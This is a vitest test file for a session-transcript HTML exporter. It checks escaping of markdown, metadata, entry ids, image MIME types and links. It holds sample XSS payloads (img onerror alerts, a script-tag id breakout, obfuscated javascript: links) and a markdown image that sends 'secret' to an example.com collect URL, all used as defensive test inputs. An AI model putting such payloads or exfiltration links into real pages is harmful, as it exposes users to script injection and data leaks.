// Tests exported HTML transcript escaping and template safety.
import { describe, expect, it } from "vitest";
import {
  now,
  renderTemplate,
  requireElement,
  type SessionData,
  type SessionEntry,
  templateCss,
} from "../../../../test/helpers/export-html-template.js";

function makeEntry(
  id: string,
  parentId: string | null,
  fields: Omit<SessionEntry, "id" | "parentId" | "timestamp">,
): SessionEntry {
  return { id, parentId, timestamp: now(), ...fields };
}

function makeMessage(id: string, parentId: string | null, message: unknown): SessionEntry {
  return makeEntry(id, parentId, { type: "message", message });
}

function makeAssistantTextEntry(id: string, parentId: string | null, text: string): SessionEntry {
  return makeMessage(id, parentId, { role: "assistant", content: [{ type: "text", text }] });
}

function makeSession(
  id: string,
  entries: SessionEntry[],
  leafId: string | null,
  options: Pick<SessionData, "warning" | "hasLeafControl"> = {},
): SessionData {
  return {
    header: { id, timestamp: now() },
    entries,
    leafId,
    systemPrompt: "",
    tools: [],
    ...options,
  };
}

function firstSelectorForDisplay(css: string, display: string, startAt: number): string | null {
  const displayRule = new RegExp(`([^{}]+)\\{[^{}]*\\bdisplay\\s*:\\s*${display}\\s*;`, "g");
  displayRule.lastIndex = startAt;
  const match = displayRule.exec(css);
  return match?.[1]?.split(",").at(-1)?.trim() ?? null;
}

describe("export html sidebar trigger affordance", () => {
  it("lets the mobile hamburger display rule win the CSS cascade", () => {
    const baseSelector = "#hamburger.sidebar-menu-trigger";
    const mobileMediaIndex = templateCss.indexOf("@media (max-width: 900px)");
    const mobileSelector = firstSelectorForDisplay(templateCss, "inline-flex", mobileMediaIndex);

    expect(mobileMediaIndex).toBeGreaterThan(templateCss.indexOf(`${baseSelector} {`));
    expect(mobileSelector).toBe(baseSelector);
  });
});

describe("export html security hardening", () => {
  it.each(["consult", "answer"])(
    "honors hidden input with %s selected while preserving raw export",
    async (leafId) => {
      function message(id: string, parentId: string | null, content: string, role = "assistant") {
        return makeMessage(id, parentId, { role, content });
      }

      const session = makeSession(
        "session-hidden-input",
        [
          makeEntry("hidden-root", "hidden-root", {
            type: "custom_message",
            customType: "context",
            content: "Hidden root context",
            display: false,
          }),
          message("speech", "hidden-root", "Explain the change. Context: Spoken style:", "user"),
          makeMessage("consult", "speech", {
            role: "user",
            content: "Synthetic consultation instructions",
            display: false,
            provenance: { kind: "internal_system", sourceTool: "openclaw_agent_consult" },
          }),
          message("answer", "consult", "The change is ready."),
          message("alternative", "speech", "An alternative reply."),
          message("other-root", null, "Another conversation."),
        ],
        leafId,
      );

      const { document, downloadJson } = await renderTemplate(session);
      expect(document.querySelectorAll(".user-message")).toHaveLength(1);
      expect(document.getElementById("entry-speech")?.textContent).toContain(
        "Explain the change. Context: Spoken style:",
      );
      expect(document.getElementById("entry-consult")).toBeNull();
      expect(document.getElementById("entry-hidden-root")).toBeNull();
      const treeIds = () =>
        Array.from(document.querySelectorAll(".tree-node"), (node) => node.getAttribute("data-id"));
      const treePrefixes = () =>
        Array.from(document.querySelectorAll(".tree-prefix"), (node) => node.textContent);
      expect(treeIds()).toEqual(["speech", "answer", "alternative", "other-root"]);
      expect(treePrefixes()).toEqual(["", "├─ ", "└─ ", ""]);
      const selectFilter = (filter: string) =>
        requireElement(
          document.querySelector<HTMLButtonElement>(`[data-filter="${filter}"]`),
          "filter missing",
        ).click();
      selectFilter("all");
      expect(treeIds()).toEqual([
        "hidden-root",
        "speech",
        "consult",
        "answer",
        "alternative",
        "other-root",
      ]);
      expect(treePrefixes()).toEqual(["", "   ", "   ├─ ", "   │     ", "   └─ ", ""]);
      expect(document.querySelector('[data-id="consult"]')?.textContent).toContain(
        "[hidden] user:",
      );
      requireElement(
        document.querySelector<HTMLElement>('[data-id="consult"]'),
        "hidden tree entry missing",
      ).click();
      expect(document.getElementById("entry-answer")?.textContent).toContain(
        "The change is ready.",
      );
      expect(document.getElementById("entry-consult")).toBeNull();
      selectFilter("user-only");
      expect(treeIds()).not.toContain("consult");
      selectFilter("default");
      expect(treeIds()).toEqual(["speech", "answer", "alternative", "other-root"]);
      expect(treePrefixes()).toEqual(["", "├─ ", "└─ ", ""]);
      expect(document.getElementById("header-container")?.textContent).toContain(
        "2 user, 3 assistant, 1 custom",
      );
      const encoded = requireElement(
        document.getElementById("session-data"),
        "session data missing",
      );
      expect(JSON.parse(Buffer.from(encoded.textContent ?? "", "base64").toString("utf8"))).toEqual(
        session,
      );
      expect((await downloadJson()).split("\n").map((line) => JSON.parse(line))).toEqual([
        { type: "header", ...session.header },
        ...session.entries,
      ]);
    },
  );

  it("renders export warnings in the header without interpreting HTML", async () => {
    const warning = 'Backend <img src=x onerror="alert(1)"> transcript is incomplete';
    const session = makeSession(
      "session-warning",
      [makeMessage("1", null, { role: "user", content: "hello" })],
      "1",
      {
        warning,
      },
    );

    const { document } = await renderTemplate(session);
    const header = requireElement(
      document.getElementById("header-container"),
      "header root missing",
    );
    const warningNode = requireElement(
      header.querySelector(".export-warning"),
      "export warning missing",
    );

    expect(warningNode.textContent).toBe(warning);
    expect(warningNode.querySelector("img[onerror]")).toBeNull();
    expect(warningNode.innerHTML).toContain(
      'Backend &lt;img src=x onerror="alert(1)"&gt; transcript is incomplete',
    );
  });

  it("renders an explicitly selected empty branch without inactive messages", async () => {
    const session = makeSession(
      "session-empty",
      [
        makeMessage("inactive-tail", null, { role: "assistant", content: "inactive history" }),
        makeEntry("empty-leaf", "inactive-tail", {
          type: "leaf",
          targetId: null,
        }),
      ],
      null,
      {
        hasLeafControl: true,
      },
    );

    const { document } = await renderTemplate(session);
    const messages = requireElement(document.getElementById("messages"), "messages root missing");
    expect(messages.textContent).not.toContain("inactive history");
  });

  it("escapes raw HTML from markdown blocks", async () => {
    const attack = "<img src=x onerror=alert(1)>";
    const session = makeSession(
      "session-1",
      [
        makeMessage("1", null, { role: "user", content: attack }),
        makeEntry("2", "1", {
          type: "branch_summary",
          summary: attack,
        }),
        makeEntry("3", "2", {
          type: "custom_message",
          customType: "x",
          display: true,
          content: attack,
        }),
      ],
      "3",
    );

    const { document } = await renderTemplate(session);
    const messages = requireElement(document.getElementById("messages"), "messages root missing");
    expect(messages.querySelector("img[onerror]")).toBeNull();
    expect(messages.innerHTML).toContain("&lt;img src=x onerror=alert(1)&gt;");
  });

  it("renders Markdown and TypeScript highlighting without external assets", async () => {
    const session = makeSession(
      "session-render",
      [
        makeMessage("1", null, {
          role: "assistant",
          content: "**rendered**\n\n```typescript\nconst answer = true;\n```",
        }),
      ],
      "1",
    );

    const { document } = await renderTemplate(session);
    const messages = requireElement(document.getElementById("messages"), "messages root missing");
    expect(messages.querySelector("strong")?.textContent).toBe("rendered");
    const code = requireElement(
      messages.querySelector("pre code.hljs"),
      "highlighted code missing",
    );
    expect(code.querySelector(".hljs-keyword")?.textContent).toBe("const");
    expect(code.textContent).toContain("answer = true");
  });

  it.each(["user", "assistant"] as const)(
    "renders tight-list inline formatting in %s transcript exports",
    async (role) => {
      const inline =
        "**Important**: read [the guide](https://example.test/guide) and use `config.json`.";
      const literal = "**literal** [not a link](https://example.test/literal)";
      const session = makeSession(
        "session-tight-list",
        [
          makeMessage("tight-list", null, {
            role,
            content: [
              `Paragraph control: ${inline}`,
              "",
              `- ${inline}`,
              "- Plain item.",
              "",
              "`" + literal + "`",
            ].join("\n"),
          }),
        ],
        "tight-list",
      );

      const { document } = await renderTemplate(session);
      const entry = requireElement(document.getElementById("entry-tight-list"), "entry missing");
      const paragraph = requireElement(entry.querySelector("p"), "paragraph control missing");
      expect(paragraph.querySelector("strong")?.textContent).toBe("Important");
      expect(paragraph.querySelector("a")?.getAttribute("href")).toBe("https://example.test/guide");
      expect(paragraph.querySelector("code")?.textContent).toBe("config.json");

      const list = requireElement(entry.querySelector("ul"), "tight list missing");
      expect(list.querySelectorAll("li")).toHaveLength(2);
      const item = requireElement(list.querySelector("li"), "list item missing");
      expect(item.querySelector("strong")?.textContent).toBe("Important");
      const link = requireElement(item.querySelector("a"), "list link missing");
      expect(link.getAttribute("href")).toBe("https://example.test/guide");
      expect(link.textContent).toBe("the guide");
      expect(item.querySelector("code")?.textContent).toBe("config.json");
      expect(item.textContent?.trim()).toBe("Important: read the guide and use config.json.");

      const literalParagraph = requireElement(
        Array.from(entry.querySelectorAll("p")).find(
          (candidate) => candidate.querySelector("code")?.textContent === literal,
        ) ?? null,
        "literal code control missing",
      );
      expect(literalParagraph.textContent).toBe(literal);
      expect(literalParagraph.querySelector("a, strong")).toBeNull();
    },
  );

  it("escapes tree and header metadata fields", async () => {
    const attack = "<img src=x onerror=alert(9)>";
    const baseEntries: SessionEntry[] = [
      makeMessage("1", null, { role: "user", content: "ok" }),
      makeMessage("2", "1", {
        role: "assistant",
        model: attack,
        provider: "p",
        content: [{ type: "text", text: "assistant" }],
      }),
      makeMessage("3", "2", { role: "toolResult", toolName: attack }),
      makeEntry("4", "3", {
        type: "model_change",
        provider: "p",
        modelId: attack,
      }),
      makeEntry("5", "4", {
        type: "thinking_level_change",
        thinkingLevel: attack,
      }),
      makeEntry("6", "5", {
        type: attack,
      }),
    ];

    const headerSession = makeSession("session-2", baseEntries, "6");

    const { document } = await renderTemplate(headerSession);
    const tree = requireElement(document.getElementById("tree-container"), "tree root missing");
    const header = requireElement(
      document.getElementById("header-container"),
      "header root missing",
    );
    expect(tree.querySelector("img[onerror]")).toBeNull();
    expect(header.querySelector("img[onerror]")).toBeNull();
    expect(tree.innerHTML).toContain("&lt;img src=x onerror=alert(9)&gt;");
    expect(header.innerHTML).toContain("&lt;img src=x onerror=alert(9)&gt;");

    const modelLeafSession = makeSession("session-2-model", baseEntries, "4");
    const modelLeaf = (await renderTemplate(modelLeafSession)).document;
    expect(modelLeaf.getElementById("tree-container")?.querySelector("img[onerror]")).toBeNull();
    expect(modelLeaf.getElementById("tree-container")?.innerHTML).toContain(
      "&lt;img src=x onerror=alert(9)&gt;",
    );

    const thinkingLeafSession = makeSession("session-2-thinking", baseEntries, "5");
    const thinkingLeaf = (await renderTemplate(thinkingLeafSession)).document;
    expect(thinkingLeaf.getElementById("tree-container")?.querySelector("img[onerror]")).toBeNull();
    expect(thinkingLeaf.getElementById("tree-container")?.innerHTML).toContain(
      "&lt;img src=x onerror=alert(9)&gt;",
    );
  });

  it("sanitizes image MIME types used in data URLs", async () => {
    const session = makeSession(
      "session-3",
      [
        makeMessage("1", null, {
          role: "user",
          content: [
            {
              type: "image",
              data: "AAAA",
              mimeType: 'image/png" onerror="alert(7)',
            },
          ],
        }),
      ],
      "1",
    );

    const { document } = await renderTemplate(session);
    const img = requireElement(
      document.querySelector("#messages .message-image"),
      "message image missing",
    );
    expect(img.getAttribute("onerror")).toBeNull();
    expect(img.getAttribute("src")).toBe("data:application/octet-stream;base64,AAAA");
  });

  it("flattens remote markdown images but keeps data-image markdown", async () => {
    const dataImage = "data:image/png;base64,AAAA";
    const session = makeSession(
      "session-4",
      [
        makeAssistantTextEntry(
          "1",
          null,
          `Leak:\n\n![exfil](https://example.com/collect?data=secret)\n\n![pixel](${dataImage})`,
        ),
      ],
      "1",
    );

    const { document } = await renderTemplate(session);
    const messages = requireElement(document.getElementById("messages"), "messages root missing");
    expect(messages.querySelector('img[src^="https://"]')).toBeNull();
    expect(messages.textContent).toContain("exfil");
    requireElement(
      messages.querySelector(`img[src="${dataImage}"]`),
      "data markdown image missing",
    );
  });

  it("flattens unsafe markdown links while preserving safe links", async () => {
    const session = makeSession(
      "session-5",
      [
        makeMessage("1", null, {
          role: "user",
          content: [
            "[script](javascript:alert(1))",
            "[encoded](java&#x73;cript&colon;alert(2))",
            "[split](java&Tab;script&colon;alert(3))",
            "[zero-width](java&#x200b;script&colon;alert(4))",
            "[surrogate](java&#xd800;script&colon;alert(5))",
            '[safe](https://example.com/report "report")',
          ].join("\n"),
        }),
        makeAssistantTextEntry(
          "2",
          "1",
          "[data](data:text/html;base64,PGgxPnBvYzwvaDE+) [mail](mailto:test@example.com)",
        ),
        makeEntry("3", "2", {
          type: "branch_summary",
          summary: "[relative](./notes.md)",
        }),
        makeEntry("4", "3", {
          type: "custom_message",
          customType: "x",
          display: true,
          content: "[hash](#entry-1)",
        }),
      ],
      "4",
    );

    const { document } = await renderTemplate(session);
    const messages = requireElement(document.getElementById("messages"), "messages root missing");
    const hrefs = Array.from(messages.querySelectorAll("a"), (link) => link.getAttribute("href"));

    expect(hrefs).toEqual([
      "https://example.com/report",
      "mailto:test@example.com",
      "./notes.md",
      "#entry-1",
    ]);
    expect(messages.querySelector("a")?.getAttribute("title")).toBe("report");
    expect(messages.textContent).toContain("script");
    expect(messages.textContent).toContain("encoded");
    expect(messages.textContent).toContain("split");
    expect(messages.textContent).toContain("zero-width");
    expect(messages.textContent).toContain("surrogate");
    expect(messages.textContent).toContain("data");
    expect(hrefs.some((href) => href?.startsWith("javascript:") || href?.startsWith("data:"))).toBe(
      false,
    );
  });

  it("escapes entry.id in element id and data-entry-id attributes", async () => {
    const xssId = `"><script>alert(1)</script><div data-x="`;
    const session = makeSession(
      "session-xss-id",
      [
        makeMessage(xssId, null, { role: "user", content: "hello" }),
        makeAssistantTextEntry("safe-child", xssId, "world"),
      ],
      "safe-child",
    );

    const { document } = await renderTemplate(session);
    const messages = requireElement(document.getElementById("messages"), "messages root missing");

    expect(messages.querySelectorAll("script").length).toBe(0);

    expect(messages.querySelector("[onmouseover]")).toBeNull();

    const copyBtn = requireElement(
      messages.querySelector(".copy-link-btn"),
      "copy-link button missing",
    );
    expect(copyBtn.hasAttribute("data-entry-id")).toBe(true);
    expect(copyBtn.hasAttribute("data-x")).toBe(false);
    expect((copyBtn as HTMLElement).dataset.entryId).toBe(xssId);

    const userMsg = requireElement(
      messages.querySelector(".user-message"),
      "user message element missing",
    );
    expect(userMsg.getAttribute("data-x")).toBeNull();
    expect(document.getElementById(`entry-${xssId}`)).toBe(userMsg);
    const elementId = userMsg.getAttribute("id") ?? "";
    expect(elementId.startsWith("entry-")).toBe(true);
  });

  it("truncates tree node text without splitting surrogate pairs", async () => {
    const emoji = "😀";
    const prefix = "x".repeat(99);
    const session = makeSession(
      "session-surrogate-truncation",
      [makeMessage("surrogate-user", null, { role: "user", content: `${prefix}${emoji}tail` })],
      "surrogate-user",
    );

    const { document } = await renderTemplate(session);
    const treeText =
      Array.from(document.querySelectorAll(".tree-content")).find((node) =>
        node.textContent?.includes("user:"),
      )?.textContent ?? "";

    expect(treeText).toContain(`user: ${prefix}...`);
    expect(treeText).not.toContain(emoji);
    expect(treeText).not.toMatch(
      /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/u,
    );
  });

  it("escapes markdown data-image attributes", async () => {
    const dataImage = "data:image/png;base64,AAAA";
    const session = makeSession(
      "session-6",
      [
        makeAssistantTextEntry("1", null, `![x" onerror="alert(1)](${dataImage})`),
      ],
      "1",
    );

    const { document } = await renderTemplate(session);
    const img = requireElement(document.querySelector("#messages img"), "message image missing");
    expect(img.getAttribute("onerror")).toBeNull();
    expect(img.getAttribute("alt")).toBe('x" onerror="alert(1)');
    expect(img.getAttribute("src")).toBe(dataImage);
  });

  it("does not crash when assistant message has non-array content", async () => {
    for (const content of [null, undefined, "plain string", 42]) {
      const session = makeSession(
        "session-malformed-assistant",
        [
          makeMessage("1", null, { role: "user", content: "hello" }),
          makeMessage("2", "1", { role: "assistant", content }),
        ],
        "2",
      );
      const { document } = await renderTemplate(session);
      if (typeof content === "string") {
        expect(document.querySelector(".assistant-message")?.textContent).toContain(content);
      }
    }
  });

  it("renders string tool-result content", async () => {
    const session = makeSession(
      "session-string-tool-result",
      [
        makeMessage("1", null, { role: "user", content: "run a command" }),
        makeMessage("2", "1", {
          role: "assistant",
          content: [
            {
              type: "toolCall",
              id: "call-1",
              name: "bash",
              arguments: { command: "echo legacy" },
            },
          ],
        }),
        makeMessage("3", "2", {
          role: "toolResult",
          toolCallId: "call-1",
          content: "legacy output",
        }),
      ],
      "3",
    );

    const { document } = await renderTemplate(session);
    expect(document.querySelector(".tool-output")?.textContent).toContain("legacy output");
  });

  it("does not crash when user message has non-array non-string content", async () => {
    for (const content of [null, undefined, 42]) {
      const session = makeSession(
        "session-malformed-user",
        [makeMessage("1", null, { role: "user", content })],
        "1",
      );
      await expect(renderTemplate(session)).resolves.toBeDefined();
    }
  });
});

describe("export html tool call previews", () => {
  it("truncates tool previews without splitting emoji", async () => {
    const bashPrefix = "a".repeat(49);
    const genericPrefix = "b".repeat(29);
    const bashExecutionPrefix = "c".repeat(99);
    const session = makeSession(
      "session-tool-preview-emoji",
      [
        makeMessage("1", null, { role: "user", content: "run tools" }),
        makeMessage("2", "1", {
          role: "assistant",
          content: [
            {
              type: "toolCall",
              id: "call-bash",
              name: "bash",
              arguments: { command: `${bashPrefix}😀tail` },
            },
            {
              type: "toolCall",
              id: "call-custom",
              name: "custom",
              arguments: { value: `${genericPrefix}😀tail` },
            },
          ],
        }),
        makeMessage("3", "2", {
          role: "toolResult",
          toolCallId: "call-bash",
          content: "bash output",
        }),
        makeMessage("4", "3", {
          role: "toolResult",
          toolCallId: "call-custom",
          content: "custom output",
        }),
        makeMessage("5", "4", {
          role: "bashExecution",
          command: `${bashExecutionPrefix}😀tail`,
        }),
      ],
      "5",
    );

    const { document } = await renderTemplate(session);
    const previews = ["3", "4", "5"].map(
      (id) =>
        requireElement(
          document.querySelector(`.tree-node[data-id="${id}"] .tree-content`),
          `tool preview ${id} missing`,
        ).textContent,
    );

    expect(previews).toEqual([
      `[bash: ${bashPrefix}...]`,
      `[custom: {"value":"${genericPrefix}...]`,
      `[bash]: ${bashExecutionPrefix}...`,
    ]);
  });
});
